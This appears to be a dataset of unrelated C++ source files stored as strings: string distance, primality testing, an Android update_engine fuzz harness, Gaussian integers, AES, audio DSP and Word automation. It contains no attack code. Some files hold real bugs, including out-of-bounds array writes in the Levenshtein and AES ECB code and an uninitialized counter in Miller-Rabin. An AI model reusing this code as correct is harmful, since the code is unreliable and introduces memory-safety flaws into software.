    "#include <iostream>\n#include<cassert>\n#include<numeric>\n#include<algorithm>\n#include<chrono>\n\ntemplate<typename T>\ninline typename T::size_type levenshteinDistance(const T& source, const T& target)\n{\n    using TSizeType = typename T::size_type;\n\n    TSizeType m = source.length();\n    TSizeType n = target.length();\n    TSizeType cost;\n    TSizeType i, j;\n\n    if (m < n)\n    {\n        std::swap(m, n);\n        TSizeType prevRow[n + 1];\n        TSizeType currentRow[n + 1];\n\n        std::iota(prevRow, prevRow + n + 2, 0);\n\n        for (i = 1; i <= m; ++i) {\n            currentRow[0] = i;\n            for (j = 1; j <= n; ++j) {\n                cost = target[i - 1] != source[j - 1];\n                currentRow[j] = std::min({currentRow[j - 1] + 1, prevRow[j] + 1, prevRow[j - 1] + cost});\n            }\n            std::copy(currentRow, currentRow+n+2, prevRow);\n        }\n\n        return currentRow[n];\n    }\n\n    TSizeType prevRow[n + 1];\n    TSizeType currentRow[n + 1];\n\n    std::iota(prevRow, prevRow + n + 2, 0);\n\n    for (i = 1; i <= m; ++i) {\n        currentRow[0] = i;\n        for (j = 1; j <= n; ++j) {\n            cost = source[i - 1] != target[j - 1];\n            currentRow[j] = std::min({currentRow[j - 1] + 1, prevRow[j] + 1, prevRow[j - 1] + cost});\n        }\n\n        std::copy(currentRow, currentRow+n+2, prevRow);\n    }\n\n    return currentRow[n];\n}\n\nvoid test_func()\n{\n    auto start = std::chrono::high_resolution_clock::now();\n    assert(levenshteinDistance<std::string>(\"ARMA\", \"ALKATRAS\") == 6);\n    assert(levenshteinDistance<std::string>(\"b\", \"\") == 1);\n    assert(levenshteinDistance<std::string>(\"ammmmmmmooooooooogggggggggguuuuuuuuuussssssss\", \"kalahmatkadakldkqwdjqfjsdhjldhfqklfwfhlhfejkwrflwnfhkwejukoikjhefndwzs\") == 66);\n    assert(levenshteinDistance<std::string>(\"biba\", \"boba\") == 1);\n    assert(levenshteinDistance<std::string>(\"avstria\", \"avstralia\") == 2);\n    assert(levenshteinDistance<std::string>(\"kotik\", \"skotina\") == 3);\n    assert(levenshteinDistance<std::string>(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "#include \"sieve.hpp\"\n#include \"random\"\n\nbool millerRabin(int n, int k) {\n\tint d = n - 1;\n\tint s;\n\twhile ((d % 2) == 0) {\n\t\td /= 2;\n\t\ts++;\n\t}\n\n\tfor (int i = 0; i < k; i++) {\n\t\tstd::random_device r;\n\n    \t// Choose a random mean between 1 and 6\n    \tstd::default_random_engine e1(r());\n    \tstd::uniform_int_distribution<int> uniform_dist(2,  n - 1);\n    \tint a = uniform_dist(e1);\n\n\t\tint x = myPow(a, d) % n;\n\n\t\tif (x == 1 || x == n - 1) continue;\n\n\t\tbool continueMaybe = false;\n\n\t\tfor (int j = 0; j < s - 1; j++) {\n\t\t\tx = (x*x) % n;\n\t\t\tif (x == 1) return false;\n\t\t\tif (x == n - 1) {\n\t\t\t\tcontinueMaybe = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (continueMaybe) {\n\t\t\tcontinue;\n\t\t}\n\n\t\treturn false;\n\t}\n\treturn true;\n}\n\nint main() {\n\tstd::string n;\n    std::cin >> n;\n    std::size_t pos{};\n\n\t//std::vector<int> v = sieve(stoi(n, &pos));\n\n\t//for (int i = 0; i < v.size(); i++) {\n    \tif (millerRabin(stoi(n, &pos), 20)) {\n\t\t\tstd::cout << n << \": probably prime\" << std::endl;\n\t\t}\n\t\telse {\n\t\t\tstd::cout << n << \": composite\" << std::endl;\n\t\t}\n\t//}\n\treturn 0;\n}",
    "/*\n * Copyright (C) 2023 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <fuzzbinder/libbinder_driver.h>\n\n#include <binderwrapper/binder_wrapper.h>\n\n#include \"update_engine/aosp/daemon_android.h\"\n#include \"update_engine/aosp/daemon_state_android.h\"\n\nusing chromeos_update_engine::BinderUpdateEngineAndroidService;\nusing chromeos_update_engine::BinderUpdateEngineAndroidStableService;\nusing chromeos_update_engine::DaemonStateAndroid;\n\nusing android::fuzzService;\nusing android::sp;\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {\n  android::BinderWrapper::Create();\n\n  brillo::BaseMessageLoop message_loop_;\n  message_loop_.SetAsCurrent();\n\n  auto daemonStateAndroid = std::make_unique<DaemonStateAndroid>();\n  daemonStateAndroid->Initialize();\n\n  auto binderService = sp<BinderUpdateEngineAndroidService>::make(\n      daemonStateAndroid->service_delegate());\n  auto stableBinderService = sp<BinderUpdateEngineAndroidStableService>::make(\n      daemonStateAndroid->service_delegate());\n  // TODO(b/287253479) - Add seed corpus/dicts for this fuzzer which has valid\n  // urls\n  fuzzService({binderService, stableBinderService},\n              FuzzedDataProvider(data, size));\n\n  android::BinderWrapper::Destroy();\n  return 0;\n}\n",
    "#include <iostream>\r\n#include <cmath>\r\n\r\nstruct LiczbaGausa {\r\n\tint real;\r\n\tint imaginary;\r\n};\r\n\r\nint norma (LiczbaGausa& l){\r\n\treturn (l.real * l.real) + (l.imaginary * l.imaginary);\r\n}\r\n\r\n//\tx = q * y + r  => r = x - q * y\r\n\r\nLiczbaGausa dzielnik(LiczbaGausa& x, LiczbaGausa& y){\r\n\tLiczbaGausa q;\r\n\tif(y.real == 0 && y.imaginary == 0){\r\n\t\tstd::cout << \"Nie mo\u017cna podzieli\u0107 przez 0\" << std::endl;\r\n\t} else{\r\n\t\tq.real = (x.real * y.real + x.imaginary * y.imaginary) / norma(y);\r\n\t\tq.imaginary = (x.imaginary * y.real - x.real * y.imaginary) / norma(y);\r\n\t}\r\n\t\r\n\treturn q;\r\n}\r\n\r\nLiczbaGausa reszta(LiczbaGausa& x, LiczbaGausa& y){\r\n\tLiczbaGausa q = dzielnik(x, y);\r\n\tLiczbaGausa r;\r\n\tr.real = x.real - q.real * y.real + q.imaginary * y.imaginary;\r\n\tr.imaginary = x.imaginary - q.real * y.imaginary - q.imaginary * y.real;\r\n\r\n\treturn r;\r\n}\r\n\r\nint main(){\r\n\tLiczbaGausa x = {3, 4};\r\n\tLiczbaGausa y = {1, 3};\r\n\r\n\tLiczbaGausa q, r;\r\n\r\n\tq = dzielnik(x, y);\r\n\tr = reszta(x, y);\r\n\r\n\tstd::cout << \"q: \" << q.real << \" + \" << q.imaginary << \"i\" << std::endl;\r\n\tstd::cout << \"r: \" << r.real << \" + \" << r.imaginary << \"i\" << std::endl;\r\n\r\n\treturn 0;\r\n}",
    "//Victor Lopez (vml45)\n//Ali Khawaja (xyr5)\n#include <iostream>\n#include <iomanip>\n#include <bitset>\n#include <sstream>\n#include <limits>\n\nusing namespace std;\n\n// Function to convert a float value to IEEE 754 bit representation\nbitset<32> cvtToIEEE(float f) {\n    auto *bits_ptr = reinterpret_cast<unsigned int *>(&f);\n    bitset<32> bs(*bits_ptr);\n    return bs;\n}\n\nint main(int argc, char *argv[]) {\n    // Check if the number of arguments is correct\n    if (argc != 3) {\n        cout << \"usage: \" << argv[0] << \" loop_bound loop_counter\" << endl;\n        return 1; // indicate error\n    }\n\n    // Parse command-line arguments\n    float loopBound, loopCounter;\n    stringstream(argv[1]) >> loopBound;\n    stringstream(argv[2]) >> loopCounter;\n\n    // Display loop bound and loop counter IEEE representations\n    cout << \"Loop bound: 0 \";\n    cout << cvtToIEEE(loopBound).to_string().substr(1, 8) << \" \";\n    cout << cvtToIEEE(loopBound).to_string().substr(9) << endl;\n\n    cout << \"Loop counter: 0 \";\n    cout << cvtToIEEE(loopCounter).to_string().substr(1, 8) << \" \";\n    cout << cvtToIEEE(loopCounter).to_string().substr(9) << endl;\n\n    // Extract exponents\n    int boundExponent = (cvtToIEEE(loopBound) >> 23).to_ulong();\n    int counterExponent = (cvtToIEEE(loopCounter) >> 23).to_ulong();\n\n    // Check for potential overflow\n    int expDiff = abs(boundExponent - counterExponent);\n    if (expDiff >= 23) { // Exponent difference more than or equal to 23 indicates overflow\n        cout << \"Warning: Possible overflow!\" << endl;\n        cout << \"Overflow threshold:\" << endl;\n        float overflow_threshold = numeric_limits<float>::max() / 2;\n        cout << scientific << setprecision(6) << overflow_threshold << endl;\n        cout << \"0 \";\n        cout << cvtToIEEE(overflow_threshold).to_string().substr(1, 8) << \" \";\n        cout << cvtToIEEE(overflow_threshold).to_string().substr(9) << endl;\n    } else {\n        cout << \"There is no overflow!\" << endl;\n    }\n\n    return 0;\n}\n",
    "/*\n\nIMPORTANT\n\nAbsolutely none of this file is my work.  It is entirely pulled from another similar tool.\nI have only changed the format of its output to fit with the rest of the project.\n\n*/\n\n\n#include \"AES.h\"\n\nAES::AES(int keyLen)\n{\n  this->N_b = 4;\n  switch (keyLen)\n  {\n  case 128:\n    this->N_k = 4;\n    this->N_r = 10;\n    break;\n  case 192:\n    this->N_k = 6;\n    this->N_r = 12;\n    break;\n  case 256:\n    this->N_k = 8;\n    this->N_r = 14;\n    break;\n  default:\n    throw \"Incorrect key length\";\n  }\n\n  blockBytesLen = 4 * this->N_b * sizeof(uint8_t);\n}\n\nvoid AES::EncryptECB(uint8_t *in, unsigned int inLen, uint8_t *key, unsigned int outLen)\n{\n  outLen = GetPaddingLength(inLen);\n  uint8_t *alignIn  = PaddingNulls(in, inLen, outLen);\n  uint8_t *roundKeys = new uint8_t[4 * N_b * (N_r + 1)];\n  KeyExpansion(key, roundKeys);\n  for (unsigned int i = 0; i < outLen; i+= blockBytesLen)\n  {\n    EncryptBlock(alignIn + i, in + i, roundKeys);\n  }\n  \n  delete[] alignIn;\n  delete[] roundKeys;\n  \n  return;\n}\n\nvoid AES::DecryptECB(uint8_t *in, unsigned int inLen, uint8_t *key)\n{\n  uint8_t *temp = new uint8_t[inLen];\n  uint8_t *roundKeys = new uint8_t[4 * N_b * (N_r + 1)];\n  KeyExpansion(key, roundKeys);\n  for (unsigned int i = 0; i < inLen; i+= blockBytesLen)\n  {\n    DecryptBlock(in + i, temp + i, roundKeys);\n  }\n  \n  memcpy(in, temp, inLen);\n  delete[] roundKeys;\n  delete[] temp;\n  return;\n}\n\n\nuint8_t *AES::EncryptCBC(uint8_t *in, unsigned int inLen, uint8_t *key, uint8_t * iv, unsigned int &outLen)\n{\n  outLen = GetPaddingLength(inLen);\n  uint8_t *alignIn  = PaddingNulls(in, inLen, outLen);\n  uint8_t *out = new uint8_t[outLen];\n  uint8_t *block = new uint8_t[blockBytesLen];\n  uint8_t *roundKeys = new uint8_t[4 * N_b * (N_r + 1)];\n  KeyExpansion(key, roundKeys);\n  memcpy(block, iv, blockBytesLen);\n  for (unsigned int i = 0; i < outLen; i+= blockBytesLen)\n  {\n    XorBlocks(block, alignIn + i, block, blockBytesLen);\n    EncryptBlock(block, out + i, roundKeys);\n    memcpy(block, out + i, blockBytesLen);\n  }\n  \n  delete[] block;\n  delete[] alignIn;\n  delete[] roundKeys;\n\n  return out;\n}\n\nuint8_t *AES::DecryptCBC(uint8_t *in, unsigned int inLen, uint8_t *key, uint8_t * iv)\n{\n  uint8_t *out = new uint8_t[inLen];\n  uint8_t *block = new uint8_t[blockBytesLen];\n  uint8_t *roundKeys = new uint8_t[4 * N_b * (N_r + 1)];\n  KeyExpansion(key, roundKeys);\n  memcpy(block, iv, blockBytesLen);\n  for (unsigned int i = 0; i < inLen; i+= blockBytesLen)\n  {\n    DecryptBlock(in + i, out + i, roundKeys);\n    XorBlocks(block, out + i, out + i, blockBytesLen);\n    memcpy(block, in + i, blockBytesLen);\n  }\n  \n  delete[] block;\n  delete[] roundKeys;\n\n  return out;\n}\n\nuint8_t *AES::EncryptCFB(uint8_t *in, unsigned int inLen, uint8_t *key, uint8_t * iv, unsigned int &outLen)\n{\n  outLen = GetPaddingLength(inLen);\n  uint8_t *alignIn  = PaddingNulls(in, inLen, outLen);\n  uint8_t *out = new uint8_t[outLen];\n  uint8_t *block = new uint8_t[blockBytesLen];\n  uint8_t *encryptedBlock = new uint8_t[blockBytesLen];\n  uint8_t *roundKeys = new uint8_t[4 * N_b * (N_r + 1)];\n  KeyExpansion(key, roundKeys);\n  memcpy(block, iv, blockBytesLen);\n  for (unsigned int i = 0; i < outLen; i+= blockBytesLen)\n  {\n    EncryptBlock(block, encryptedBlock, roundKeys);\n    XorBlocks(alignIn + i, encryptedBlock, out + i, blockBytesLen);\n    memcpy(block, out + i, blockBytesLen);\n  }\n  \n  delete[] block;\n  delete[] encryptedBlock;\n  delete[] alignIn;\n  delete[] roundKeys;\n\n  return out;\n}\n\nuint8_t *AES::DecryptCFB(uint8_t *in, unsigned int inLen, uint8_t *key, uint8_t * iv)\n{\n  uint8_t *out = new uint8_t[inLen];\n  uint8_t *block = new uint8_t[blockBytesLen];\n  uint8_t *encryptedBlock = new uint8_t[blockBytesLen];\n  uint8_t *roundKeys = new uint8_t[4 * N_b * (N_r + 1)];\n  KeyExpansion(key, roundKeys);\n  memcpy(block, iv, blockBytesLen);\n  for (unsigned int i = 0; i < inLen; i+= blockBytesLen)\n  {\n    EncryptBlock(block, encryptedBlock, roundKeys);\n    XorBlocks(in + i, encryptedBlock, out + i, blockBytesLen);\n    memcpy(block, in + i, blockBytesLen);\n  }\n  \n  delete[] block;\n  delete[] encryptedBlock;\n  delete[] roundKeys;\n\n  return out;\n}\n\nuint8_t * AES::PaddingNulls(uint8_t *in, unsigned int inLen, unsigned int alignLen)\n{\n  uint8_t *alignIn = new uint8_t[alignLen];\n  memcpy(alignIn, in, inLen);\n  memset(alignIn + inLen, 0x00, alignLen - inLen);\n  return alignIn;\n}\n\nunsigned int AES::GetPaddingLength(unsigned int len)\n{\n  unsigned int lengthWithPadding =  (len / blockBytesLen);\n  if (len % blockBytesLen) {\n\t  lengthWithPadding++;\n  }\n  \n  lengthWithPadding *=  blockBytesLen;\n  \n  return lengthWithPadding;\n}\n\nvoid AES::EncryptBlock(uint8_t *in, uint8_t *out, uint8_t *roundKeys)\n{\n  uint8_t **state = new uint8_t *[4];\n  state[0] = new uint8_t[4 * N_b];\n  int i, j, round;\n  for (i = 0; i < 4; i++)\n  {\n    state[i] = state[0] + N_b * i;\n  }\n\n\n  for (i = 0; i < 4; i++)\n  {\n    for (j = 0; j < N_b; j++)\n    {\n      state[i][j] = in[i + 4 * j];\n    }\n  }\n\n  AddRoundKey(state, roundKeys);\n\n",
    "#include <iostream>\n#include <boost/multiprecision/cpp_int.hpp>\n#include \"external/Miller_Rabin/miller_rabin.hpp\"\n\nusing namespace boost::multiprecision;\n\ncpp_int ceil_sqrt(const cpp_int& n) {\n    cpp_int left = 0;\n    cpp_int right = n;\n    cpp_int result = 0;\n\n    while (left <= right) {\n        cpp_int mid = left + (right - left) / 2;\n        if (mid * mid <= n) {\n            result = mid;\n            left = mid + 1;\n        } else {\n            right = mid - 1;\n        }\n    }\n\n    return result;\n}\n\ncpp_int findFactor(const cpp_int& n) {\n    if ((n & 1) == 0)\n        return cpp_int(2);\n     if (fudmottin::millerRabinTest(n))\n        return n;\n    auto sqrt_n = ceil_sqrt(n);\n    for (cpp_int factor = 3; factor <= sqrt_n; factor += 2)\n        if (n % factor == 0)\n            return factor;\n    return n;\n}\n\nvoid primeFactorization(cpp_int n) {\n    cpp_int fac;\n    do {\n        fac = findFactor(n);\n        cpp_int exp = 0;\n\n        if (fac == n) {\n            std::cout << n;\n            return;\n        }\n\n        do {\n            ++exp;\n            n /= fac;\n        } while ((n % fac) == 0);\n\n        std::cout << fac;\n\n        if (exp > 1) {\n            std::cout << \"^\";\n            if (!fudmottin::millerRabinTest(exp)) {\n                std::cout << \"(\";\n                primeFactorization(exp);\n                std::cout << \")\";\n            } else std::cout << exp;\n        }\n\n        if (n > 2) std::cout << \" * \";\n        std::cout.flush();\n    } while (n > 1);\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <positive integer greater than 1>\" << std::endl;\n        return -1;\n    }\n\n    cpp_int number;\n    try {\n        number = cpp_int(argv[1]);\n    } catch (const std::exception& e) {\n        std::cerr << \"Error: Invalid input: \" << e.what() << std::endl;\n        return -1;\n    }\n\n    if (number < 2) {\n        std::cerr << \"Usage: \" << argv[0] << \"< positive integer greater than 1>\" << std::endl;\n        return -1;\n    }\n\n    std::cout << number << \" = \";\n    primeFactorization(number);\n    std::cout << std::endl;\n\n    return 0;\n}\n\n",
    "/*\n Compressor contains four dynamic filters working in a circular mode,\n It controls these four filter's gain and frequencies in response to the detected resonance\n The pointed filter is applied to the resonance\n \n The timing function calculateGain() borrowed from the tutorial https://github.com/joshreiss/Audio-programming-with-VST-and-JUCE/tree/main/06%20-%20Dynamics%20Processing/A-%20Compressor\n */\n\n\n#include <JuceHeader.h>\n#include \"Compressor.h\"\n\nCompressor::Compressor(){\n\n    for (int i = 0; i < totalFilters; i++) {\n        filterGains.push_back(1.0f);\n        filterFreqs.push_back(400.0f);\n        filterIdxes.push_back(10);\n        \n        coefficients.add(juce::dsp::IIR::Coefficients<float>::Ptr());\n    }\n}\n\nvoid Compressor::setSpec(double sr,int samplesPerBlock, int numChannels){\n    numInputChannels = numChannels;\n    juce::dsp::ProcessSpec spec;\n    sampleRate = sr;\n    spec.sampleRate = sr;\n    spec.maximumBlockSize = samplesPerBlock;\n    spec.numChannels = numChannels;\n    filters.prepare(spec);\n    \n    \n}\n\nvoid Compressor::createMagnitudes(int responseResolution){\n    magnitudes.resize(responseResolution, 1.0);\n    magnitude1.resize(responseResolution, 1.0);\n    magnitude2.resize(responseResolution, 1.0);\n    magnitude3.resize(responseResolution, 1.0);\n    magnitude4.resize(responseResolution, 1.0);\n    magnitudeRegular.resize(responseResolution, 1.0);\n}\n\nfloat Compressor::calculateGain(float mag, float oldGain){\n    //mag data range 0 - 1\n    \n    // taken from 06 - Dynamics Processing - Compressor look ahead VTS\n    \n    float dbRMS = 10 * std::log10(std::max(0.000001f,std::min(1.2f,mag))); // -50 - 0\n    float dbGain = std::min(0.0f, (*ratioParam * (*threshParam - dbRMS))); // 0 - thresh\n    float newGain = std::pow(10, dbGain / 20); // 1 - 0 (1: no  change)\n    \n    float coeff;\n    if (newGain < oldGain) coeff = 1 - *attackParam/10.0f;\n    else coeff = 1 - *releaseParam/10.0f;\n    return (1 - coeff) * oldGain + coeff * newGain; \n    \n}\n\nvoid Compressor::updateFreqAndIdx(float f, int idx){\n    \n    // four peak filters work in a circular mode,\n    float dist = std::abs(freqToX(f) - freqToX(lastFreq));\n    lastFreq = f;\n    if (dist > *speedParam){ // 0.01 - 0.1\n        filterPtr = filterPtr + 1;\n        if (filterPtr == totalFilters) {\n            filterPtr = 0;\n        }\n        filterGains[filterPtr] = 1.0f;\n        filterFreqs[filterPtr] = f;\n    } else {\n        filterFreqs[filterPtr] = (1 - 0.3) * filterFreqs[filterPtr] + 0.3 * f;\n    }\n    \n    \n    filterIdxes[filterPtr] = idx;\n    \n}\n\n\nbool Compressor::updateGain(){\n    \n    for (int i = 0; i < totalFilters; i++) {\n        float newGain = 0.0f;\n        if (i == filterPtr){\n            newGain = calculateGain(fftDataPt[filterIdxes[i]], filterGains[i]);\n            filterGains[i] = newGain;\n            \n        } else {\n            newGain = calculateGain(0.0f, filterGains[i]);\n            filterGains[i] = newGain;\n        }\n        if (i == 0) {\n            coefficient1 = juce::dsp::IIR::Coefficients<float>::makePeakFilter(sampleRate, filterFreqs[i], *qParam, newGain);\n            *filters.get<0>().state = *coefficient1;\n        }\n        if (i == 1) {\n            coefficient2 = juce::dsp::IIR::Coefficients<float>::makePeakFilter(sampleRate, filterFreqs[i], *qParam, newGain);\n            *filters.get<1>().state = *coefficient2;\n        }\n        if (i == 2) {\n            coefficient3 = juce::dsp::IIR::Coefficients<float>::makePeakFilter(sampleRate, filterFreqs[i], *qParam, newGain);\n            *filters.get<2>().state = *coefficient3;\n        }\n        if (i == 3) {\n            coefficient4 = juce::dsp::IIR::Coefficients<float>::makePeakFilter(sampleRate, filterFreqs[i], *qParam, newGain);\n            *filters.get<3>().state = *coefficient4;\n        }\n    }\n\n    return false;\n}\n\n\nfloat Compressor::indexToFreq(int idx, int fftSize){\n    if (idx == 0){\n        idx = 1;\n    }\n    return float((sampleRate * idx) / fftSize);\n}\n\n\nvoid Compressor::getMagnitudes(const double* frequencies, size_t numSamples){\n    \n    std::fill(magnitudes.begin(), magnitudes.end(), 1.0);\n    \n    coefficient1->getMagnitudeForFrequencyArray(frequencies, magnitude1.data(), numSamples, sampleRate);\n    juce::FloatVectorOperations::multiply(magnitudes.data(), magnitude1.data(), static_cast<int> (magnitudes.size()));\n    \n    coefficient2->getMagnitudeForFrequencyArray(frequencies, magnitude2.data(), numSamples, sampleRate);\n    juce::FloatVectorOperations::multiply(magnitudes.data(), magnitude2.data(), static_cast<int> (magnitudes.size()));\n    \n    coefficient3->getMagnitudeForFrequencyArray(frequencies, magnitude3.data(), numSamples, sampleRate);\n    juce::FloatVectorOperations::multiply(magnitudes.data(), magnitude3.data(), static_cast<int> (magnitudes.size()));\n    \n    coefficient4->getMagnitudeForFrequencyArray(frequencies, magnitude4.data(), numSamples, sampleRate);\n    juce::FloatVectorOperations::multiply(magnitudes.data(), magnitude4.data(), static_c",
    "#include \"qword.h\"\n#include \"qword_impl.h\"\n#include <QAxObject>\n#include <QDebug>\n#include <QFileInfo>\n\n// \u4ece\u7b2c\u4e00\u5217\u5f00\u59cb \u975e0\nconstexpr int kTableColBegin = 1;\n// \u8868\u683c\u4ece\u7b2c\u4e8c\u884c\u5f00\u59cb \u7b2c\u4e00\u884c\u662f\u8868\u5934\nconstexpr int kTableRowBegin = 2;\n\nQWord::QWord()\n    : m_impl(std::make_shared<QWordImpl>())\n{\n}\n\nQWord::QWord(const QString &path) : QWord()\n{\n    Open(path);\n}\n\nbool QWord::Open(const QString &path)\n{\n    if (!QFileInfo::exists(path))\n    {\n        return false;\n    }\n\n    m_path = path;\n\n    auto *documents = m_impl->querySubObject(\"Documents\");\n    if (!documents)\n    {\n        return false;\n    }\n\n    documents->dynamicCall(\"Add(QString)\", path);\n    m_impl->m_activeDoc = m_impl->querySubObject(\"ActiveDocument\");\n\n    return m_impl->m_activeDoc != nullptr;\n}\n\nvoid QWord::Save(QString save_as)\n{\n    if (save_as.isEmpty())\n    {\n        save_as = m_path;\n    }\n    m_impl->m_activeDoc->dynamicCall(\"SaveAs(QString)\", save_as);\n    m_impl->m_activeDoc->dynamicCall(\"Close(boolean)\", true);\n    m_impl->dynamicCall(\"Quit(void)\");\n}\n\nQWord &QWord::operator[](const QString &bookmark)\n{\n    m_impl->m_currentBookmark = m_impl->m_activeDoc->querySubObject(\"Bookmarks(QString)\", bookmark);\n    if (!m_impl->m_currentBookmark)\n    {\n        qWarning() << \"Bookmark\" << bookmark << \"does not exists\";\n    }\n    return *this;\n}\n\nQWord &QWord::operator=(const QString &content)\n{\n    auto *selection = m_impl->SelectCurrentBookmark();\n\n    if (!selection)\n    {\n        return *this;\n    }\n\n    selection->dynamicCall(\"TypeText(QString)\", content);\n\n    return *this;\n}\n\nQWord &QWord::operator=(const QWordTable &table)\n{\n    auto *selection = m_impl->SelectCurrentBookmark();\n\n    if (!selection)\n    {\n        return *this;\n    }\n\n    // \u6c34\u5e73\u5c45\u4e2d\n    selection->querySubObject(\"ParagraphFormat\")->dynamicCall(\"Alignment\", \"wdAlignParagraphCenter\");\n\n    auto row = table.GetRowCount();\n    auto column = table.GetColumnCount();\n    QAxObject *range = selection->querySubObject(\"Range\");\n    QAxObject *tables = 